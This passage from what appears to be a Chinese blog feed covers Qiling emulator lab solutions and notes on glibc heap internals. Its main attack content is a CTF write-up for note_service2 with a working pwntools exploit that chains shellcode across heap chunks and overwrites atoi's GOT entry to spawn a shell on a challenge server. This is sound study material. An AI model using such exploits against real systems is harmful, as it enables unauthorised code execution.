class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandom_hook</span>(<span class="params">q1, buf, buflen, flag, *args, **kw</span>):</span><br><span class="line">    q1.mem.write(buf, <span class="string">b&#x27;\x00&#x27;</span>*buflen)</span><br><span class="line">    q1.os.set_syscall_return(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">q1</span>):    </span><br><span class="line">    q1.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>, getrandom_hook)</span><br><span class="line">    q1.add_fs_mapper(<span class="string">&quot;/dev/urandom&quot;</span>, Fake_urandom())</span><br></pre></td></tr></table></figure><h1 id="Challenge4-Hook-address-无用循环"><a href="#Challenge4-Hook-address-无用循环" class="headerlink" title="Challenge4: Hook address 无用循环"></a>Challenge4: Hook address 无用循环</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled4.png" class title="Untitled"><p>需要hook 0x100fe0处的条件比较才能进入for循环，直接把x0寄存器改掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loop_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    condition_loop_enter = base_addr + <span class="number">0xfe0</span></span><br><span class="line">    q1.hook_address(loop_hook, condition_loop_enter)</span><br></pre></td></tr></table></figure><h1 id="challenge5-hook外部函数-rand"><a href="#challenge5-hook外部函数-rand" class="headerlink" title="challenge5: hook外部函数 rand"></a>challenge5: hook外部函数 rand</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled5.png" class title="Untitled"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand_hook</span>(<span class="params">q1, *args, **kw</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">0</span> <span class="comment"># 设置rand函数的返回值为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.os.set_api(<span class="string">&quot;rand&quot;</span>, rand_hook)</span><br></pre></td></tr></table></figure><h1 id="challenge6-hook-address-突破无限循环"><a href="#challenge6-hook-address-突破无限循环" class="headerlink" title="challenge6: hook address 突破无限循环"></a>challenge6: hook address 突破无限循环</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled6.png" class title="Untitled"><p>和前面challenge4很像，直接hook比较的之前的结果就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">infinite_loop_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    add_addr = base_addr + <span class="number">0x1114</span></span><br><span class="line">    q1.hook_address(infinite_loop_hook , add_addr)</span><br></pre></td></tr></table></figure><h1 id="challenge7-hook外部函数-sleep"><a href="#challenge7-hook外部函数-sleep" class="headerlink" title="challenge7: hook外部函数 sleep"></a>challenge7: hook外部函数 sleep</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled7.png" class title="Untitled"><p>在sleep函数执行之前把参数改成0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sleep_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.arch.regs.x0 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.os.set_api(<span class="string">&quot;sleep&quot;</span>, sleep_hook, QL_INTERCEPT.ENTER)</span><br></pre></td></tr></table></figure><h1 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8 :"></a>challenge8 :</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled8.png" class title="Untitled"><p>需要我们在堆上hook 结构体使得s→check &#x3D; 1，对着汇编窗口c一下d一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>1011d0 e0 <span class="number">17</span> <span class="number">40</span> f9     ldr        pvVar2,[sp, <span class="comment">#0x28] == 提取结构体所在的堆地址</span></span><br><span class="line"><span class="number">00</span>1011d4 e1 0f <span class="number">40</span> f9     ldr        x1,[sp, <span class="comment">#0x18]</span></span><br><span class="line"><span class="number">00</span>1011d8 01 08 <span class="number">00</span> f9     <span class="built_in">str</span>        x1,[pvVar2, <span class="comment">#0x10] == s-&gt;check = x1</span></span><br><span class="line"><span class="number">00</span>1011dc 1f <span class="number">20</span> 03 d5     nop                           == hook here</span><br></pre></td></tr></table></figure><p>方法1:直接读取栈上的堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_nop</span>(<span class="params">q1</span>):</span><br><span class="line">    heap_struct_addr = q1.unpack64(q1.mem.read(q1.arch.regs.sp + <span class="number">0x28</span>, <span class="number">8</span>))</span><br><span class="line">    heap_struct = q1.mem.read(heap_struct_addr,<span class="number">24</span>) <span class="comment"># 读取randomstruct结构体</span></span><br><span class="line">    some_string_addr, magic_addr, check_addr = struct.unpack(<span class="string">&#x27;QQQ&#x27;</span>,heap_struct)</span><br><span class="line">    q1.mem.write(check_addr, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    hook_addr = base_addr + <span class="number">0x11dc</span></span><br><span class="line">    q1.hook_address(hook_nop, hook_addr)</span><br></pre></td></tr></table></figure><p>方法2:内存搜索magic</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">q1</span>):</span><br><span class="line">    MAGIC = <span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">    magic_addrs = q1.mem.search(q1.pack64(MAGIC))</span><br><span class="line">    <span class="keyword">for</span> magic_addr <span class="keyword">in</span> magic_addrs:</span><br><span class="line">        <span class="comment"># 验证是否找到正确的结构体地址</span></span><br><span class="line">        candidate_heap_struct_addr = magic_addr - <span class="number">8</span></span><br><span class="line">        candidate_heap_struct = q1.mem.read(candidate_heap_struct_addr, <span class="number">24</span>)</span><br><span class="line">        string_addr, _, check_addr = struct.unpack(<span class="string">&#x27;QQQ&#x27;</span>, candidate_heap_struct)</span><br><span class="line">        <span class="keyword">if</span> q1.mem.string(string_addr) == <span class="string">&#x27;Random data&#x27;</span>:</span><br><span class="line">            q1.mem.write(check_addr, <span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">q1</span>):</span><br><span class="line">    base_addr = q1.mem.get_lib_base(q1.path)</span><br><span class="line">    hook_addr = base_addr + <span class="number">0x11dc</span></span><br><span class="line">    q1.hook_address(search_mem, hook_addr)</span><br></pre></td></tr></table></figure><h1 id="challenge9-hook外部函数-tolower"><a href="#challenge9-hook外部函数-tolower" class="headerlink" title="challenge9 : hook外部函数 tolower"></a>challenge9 : hook外部函数 tolower</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled9.png" class title="Untitled"><p>简单set_api处理一下得了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tolower_hook</span>(<span class="params">q1</span>):</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.set_api(<span class="string">&quot;tolower&quot;</span>, tolower_hook)</span><br></pre></td></tr></table></figure><h1 id="challenge10-劫持fs"><a href="#challenge10-劫持fs" class="headerlink" title="challenge10: 劫持fs"></a>challenge10: 劫持fs</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled10.png" class title="Untitled"><p>和challenge3差不多，用QlFsMappedObject劫持</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fake_cmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.add_fs_mapper(<span class="string">&quot;/proc/self/cmdline&quot;</span>, Fake_cmdline())</span><br></pre></td></tr></table></figure><h1 id="challenge11-指令级别hook"><a href="#challenge11-指令级别hook" class="headerlink" title="challenge11 : 指令级别hook"></a>challenge11 : 指令级别hook</h1><img src="/2023/06/29/Qiling-framwork-lab/Untitled11.png" class title="Untitled"><p>需要我们hook 0x1013ec这条指令，并把x0寄存器的值改成0x1337 &lt;&lt; 0x10，使用hook_code对这条指令进行指令级hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_midr_el1</span>(<span class="params">q1, addr, size</span>):</span><br><span class="line">    <span class="keyword">if</span> q1.mem.read(addr, size) == <span class="string">b&#x27;\x00\x00\x38\xD5&#x27;</span>:</span><br><span class="line">        q1.arch.regs.x0 = <span class="number">0x1337</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">        q1.arch.regs.arch_pc +=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">q1</span>):</span><br><span class="line">    q1.hook_code(hook_midr_el1)</span><br></pre></td></tr></table></figure><p>也可以在主程序运行时hook，这样hook函数就不会在共享库的目标指令出发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">q1</span>):</span><br><span class="line">    mem_map = q1.mem.map_info</span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> mem_map:</span><br><span class="line">        start, end, flags, label = entry</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># [=]     555555554000 - 555555556000   r-x (5)    [redacted]/qilinglab-aarch64 </span></span><br><span class="line">        <span class="keyword">if</span> q1.path <span class="keyword">in</span> label <span class="keyword">and</span> flags == <span class="number">5</span>:</span><br><span class="line"><span class="comment">#5表示的是r-x属性，加这个判断也是为了缩小hook的范围，提高性能。</span></span><br><span class="line">            start_hook = start</span><br><span class="line">            end_hook = end</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Use begin and end parameters to specify the range of the hook</span></span><br><span class="line">    q1.hook_code(hook_midr_el1, begin=start_hook, end=end_hook)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heapnote</title>
      <link href="/2021/06/29/heapnote/"/>
      <url>/2021/06/29/heapnote/</url>
      
        <content type="html"><![CDATA[<p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。<br>如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><blockquote><p>小内存： [获取分配区(arena)并加锁] -&gt; fast bin -&gt; unsorted bin -&gt; small bin -&gt; large bin -&gt; top chunk -&gt; 扩展堆大内存： 直接mmap</p></blockquote><p>使用<code>malloc</code>申请内存超过<code>MMAP_THRESHOLD</code>时就会调用<code>mmap</code>申请内存</p><blockquote><p>Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). MMAP_THRESHOLD is 128 kB by default, but is adjustable using mallopt(3). Allocations performed using mmap(2) are unaffected by the RLIMIT_DATA resource limit (see getrlimit(2)).</p></blockquote><p>申请到的<code>chunk</code>地址在<code>libc</code>和<code>ld</code>附近</p><p>这是比较常见的利用点</p><p>如果chunk中存在溢出或者越界读写漏洞的话，可以泄漏或修改libc或者ld中的值</p><p>简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><p>管理堆的双向链表链表结构如下：</p><img src="/2021/06/29/heapnote/Untitled.png" class title="Untitled"><p>memory被free后，heap manager还是会记录这些freed块在一个链表‘bin’里，这样再申请时会在这里面找（this is how point 1 do），找到之后标记‘allocated’并返回指向‘user data’的块指针。</p><p>bins:fast bins, the unsorted bin, small bins, large bins, and the per-thread tcache</p><img src="/2021/06/29/heapnote/Untitled1.png" class title="Untitled"><p>Arenas:</p><p>堆管理器用全局互斥锁（mutex）来维护一个内部堆结构来避免程序崩溃，就是保证每次只有一个线程与堆互动。this is how arenas comes</p><p>每个arenas独立维护自己的chunk allocation和free bins.</p><p>当进程创建新线程时，堆管理器会为每个新线程分配secondary arenas，以减少线程在执行malloc和free操作时必须等待。</p><p>我们知道主堆区在程序加载进内存的后面且用brk system call扩展，但secondary arenas不能如此，</p><p>secondary arenas模拟main heap的行为，使用一个或者多个<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452">subheaps</a>来创建（using mmap and mprotect）。</p><p>subheaps:</p><p>初始化堆（main arena）用sbrk动态扩展，而子堆使用mmap定位到内存中，堆管理器用mprotect手动模拟子堆增长。</p><img src="/2021/06/29/heapnote/Untitled2.png" class title="Untitled"><p>堆分配的chunk结构如下：</p><img src="/2021/06/29/heapnote/Untitled3.png" class title="Untitled"><p><strong>small chunks 分配规则：</strong></p><p>1.如果有刚free的chunk（存在bin里），且满足申请的大小，那么就用这个。</p><p>2.不行的话，如果heap顶有可用空间，就从中取之。</p><p>3.再不行的话，向kernel申请内存 (using sbrk()) 到heap底（end of heap），在这块新空间中取之。</p><p>4.再不行就error返回NULL。</p><p>chunk metadata:chunk的结构</p><img src="/2021/06/29/heapnote/Untitled4.png" class title="Untitled"><p><code>mchunk_size</code> 存储4样东西 ：this chunk size +’A’’M’’P’，分别存储在同样的size_t里，因为这些chunk sizes一般是8byte对齐（16byte对齐on64bit）,因此最后3bits的chunk size总是为0 </p><p>“A”：用于告诉堆管理器该块是否属于secondary arena(subheap)，而不是main arena。在 free时，堆管理器只得到一个指向程序员想要释放的分配的指针，堆管理器需要计算出该指针属于哪个领域。如果在块的元数据中设置了 A 标志，堆管理器必须搜索每个区域并查看指针是否位于该区域的任何子堆(subheap)中。如果未设置该标志，堆管理器可以缩短搜索，因为它知道块来自初始堆（initial arena&#x2F;main arena）。</p><p>“M”：标志用于指示该块是通过 mmap 在堆外分配的巨大分配。当这个分配最终被传递回 free 时，堆管理器将立即通过 munmap 将整个块返回给操作系统，而不是尝试回收它。出于这个原因，释放的块永远不会设置这个标志。</p><p>“P”：它表示前一个块是空闲块。这意味着当这个块被释放时，它可以安全地连接到前一个块上以创建一个更大的空闲块。</p><img src="/2021/06/29/heapnote/Untitled5.png" class title="Untitled"><p>Glibc heap:</p><p>free在操作指向chunk块的删减时候，会进行一系列检查来确保改块chunk是没在使用的：</p><ul><li>检查对齐：8byte on 32,16byte on 64</li><li>检查该块的大小字段是否不可能–要么是太小，要么是太大，要么不是对齐的大小，要么是会与进程的地址空间的末端重叠</li><li>检查大块位于arena的边界之内</li><li>通过检查位于下一个块开始的元数据中的相应的 “P “位，检查该块是否已经被标记为free</li></ul><p><strong>FREE CHUNK METADATA:</strong></p><img src="/2021/06/29/heapnote/Untitled6.png" class title="Untitled"><p>free掉的块也会存储这些边界信息来保证空闲块也能很快的凝聚在一起</p><h1 id="例题：-note-service2-UAF"><a href="#例题：-note-service2-UAF" class="headerlink" title="例题：**note_service2(**UAF)"></a>例题：**note_service2(**UAF)</h1><img src="/2021/06/29/heapnote/Untitled7.png" class title="Untitled"><p>**step1:**我们把shellcode分开，存储到多个堆里，然后在每个堆的最后2字节空间，填上jmp short xxxx指令，让它跳转到下一个堆里去执行代码。</p><blockquote><p>其中jmp short xxx中的xxx计算公式</p><p>xxx &#x3D; 目标地址-当前地址-2</p></blockquote><p><strong>step2：</strong>创建堆的时候是按顺序创建下来的，并且期间没有进行删除操作，我们的堆统一为8字节(根据64位堆的数据结构，至少保证有prev_size、size、fd、bk的空间，实际上的大小为8 align to 32 &#x3D; 32字节)，并且，使用中的堆块的fd和bk被当成数据区，因此我们的数据是从这里开始的，导致后面还有0x8字节空数据。</p><img src="/2021/06/29/heapnote/Untitled8.png" class title="Untitled"><p>从chunk0的jmp出跳到chunk1的data处xxxx执行新代码，那么我们jmp short后面的偏移为</p><p>next &#x3D; (2+1+8 + 8 + 8  - 2) &#x3D; 25&#x3D;0x19</p><blockquote><p>注意那个末尾的1字节0，是输入函数给我们加上的，我们真正只能使用data区的7个字节，也就是我们的每个块里最多放7个字节的指令</p></blockquote><p>**step3:**构造shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codex=(asm(&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;+&#x27;\x90\x90\xeb\x19&#x27;)#明显超范围了</span><br><span class="line">code0=(asm(&#x27;xor rax,rax&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)#左填充“\x90”保证7字节（右对齐）</span><br><span class="line">code1=(asm(&#x27;mov eax,0x3b&#x27;)+&#x27;\xeb\x19&#x27;)</span><br><span class="line">code2=(asm(&#x27;xor rsi,rsi&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)</span><br><span class="line">code3=(asm(&#x27;xor rdx,rdx&#x27;)+&#x27;\x90\x90\xeb\x19&#x27;)</span><br><span class="line">code4=(asm(&#x27;syscall&#x27;).ljust(7,&#x27;\x90&#x27;))#用ljust进行右填充（左对齐）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关键是rdi的值，在这里，如果我们将atoi的got表内容指向我们的第一个堆空间,那么当我们下一次输入选项时，我们输入&#x2F;bin&#x2F;sh就可以运行shellcode</p><img src="/2021/06/29/heapnote/Untitled9.png" class title="Untitled"><p>**step4:**把任意的地方的8字节数据写成新建的堆的地址指针，通过数组越界也就是事先创建第一个堆用来占用那个空间，最后的时候delete掉后再申请回来(fastbin特性)，我们可以把一些函数的GOT表内容修改为堆指针，由于程序NX保护是关闭的，那么堆栈里的数据也可以当成指令执行。那么我们在堆里布置shellcode即可。</p><img src="/2021/06/29/heapnote/Untitled10.png" class title="Untitled"><img src="/2021/06/29/heapnote/Untitled11.png" class title="Untitled"><p>偏移为0x40&#x2F;8 &#x3D; 8字节，也就是说,数组下标-8处就是atoi的GOT表</p><blockquote><p>分析代码可知“atoi”的参数是“read”读取来的，此处读入“&#x2F;bin&#x2F;sh”就可以代替codex了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53787</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,code0)</span><br><span class="line">malloc(<span class="number">1</span>,code1)</span><br><span class="line">malloc(<span class="number">2</span>,code2)</span><br><span class="line">malloc(<span class="number">3</span>,code3)</span><br><span class="line">malloc(<span class="number">4</span>,code4)</span><br><span class="line"><span class="comment">#删除第一个堆块</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)</span></span><br><span class="line"><span class="comment">#即修改了atoi的GOT表为我们的code0,下次调用atoi时调用的是指向code0的指针</span></span><br><span class="line">malloc(-<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="例题：noleak（mallochook-UAF）"><a href="#例题：noleak（mallochook-UAF）" class="headerlink" title="例题：noleak（mallochook+UAF）"></a>例题：noleak（mallochook+UAF）</h1><p>由于没开PIE，bss段可以随便使用</p><p>RELRO是完全开启的，不能通过修改GOT表来进行攻击</p><p>讲堆的<a href="https://paper.seebug.org/papers/Archive/refs/heap/">https://paper.seebug.org/papers/Archive/refs/heap/</a></p><h2 id="堆管理机制：bin"><a href="#堆管理机制：bin" class="headerlink" title="堆管理机制：bin"></a><strong>堆管理机制：bin</strong></h2><p>一个链表被称为一个bin，简单来说bin就是<strong>free chunk的容器</strong></p><p><strong>unsorted bin</strong>是一段特殊的bin，由free chunks组成的循环双链表，当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到<strong>unsorted bin</strong>中</p><h2 id="堆管理机制：chunk"><a href="#堆管理机制：chunk" class="headerlink" title="堆管理机制：chunk"></a><strong>堆管理机制：chunk</strong></h2><p><strong>1.allocated chunk</strong>：当前chunk是被应用层用户所使用的</p><p><strong>2.free chunk</strong>：当前chunk是空闲的，没有被应用层用户所使用</p><p><strong>3.top chunk</strong>：当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</p><p>该chunk并<strong>不属于任何bin</strong>，而是在系统当前的<strong>所有free chunk</strong>(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用</p><p><strong>4.last remainter chunk</strong>：如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong></p><h2 id="堆管理机制：ptmalloc算法"><a href="#堆管理机制：ptmalloc算法" class="headerlink" title="堆管理机制：ptmalloc算法"></a><strong>堆管理机制：ptmalloc算法</strong></h2><img src="/2021/06/29/heapnote/Untitled12.png" class title="Untitled"><p>每个arena理的chunks只有两种状态：in used or free.这些chunk放在bin上，分为fastbin、sort、large、small.</p><p>malloc_hook机制是通过重新指定内存管理的回调函数指针来实现自定义的内存管理方式，在调用对应的malloc等函数的时候，将会被自动调用到自定义的函数,malloc机制中的unsorted bin、small bins以及large bins中的双向链表中的<strong>第一个chunk以及最后一个chunk中的 fd\bk 字段，都指向了一个结构(类型为malloc_state，变量名称为arena)的固定偏移的位置</strong>，当free一个unsorted bin时，它的fd指针会指向libc中main_arena地址附近处。而在这个结构之上的固定偏移位置，则是 __malloc_hook 的地址(其值被默认设置为null).</p><img src="/2021/06/29/heapnote/Untitled13.png" class title="Untitled"><img src="/2021/06/29/heapnote/Untitled14.png" class title="Untitled"><h2 id="Unlink机制："><a href="#Unlink机制：" class="headerlink" title="Unlink机制："></a><strong>Unlink机制：</strong></h2><p>为了把指针移动到要操作的地址附近</p><p>假如我们有一个这样的堆</p><p>Chunk0(空闲)</p><p>Prevsize&#x3D;0   size&#x3D;0x101</p><p>Fd &#x3D;0x6020C8  BK &#x3D;0x6020D0</p><p>DATA&#x3D;XXXXXXXXXXXXXXXXXXXX</p><p>Chunk1(使用中)</p><p>Prevsize&#x3D;0x100 size&#x3D;0x100</p><p>DATA&#x3D;xxxxxxxxxxxxxxxxxxxx</p><p>那么，当我们释放chunk1的时候,会与chunk0发生unlink</p><p>首先，内存管理程序检查chunk1的size&#x3D;0x100，即最后的一个bit为0，说明前一个chunk处于空闲状态，那么，它会与前一个块发生合并，即从unsorted 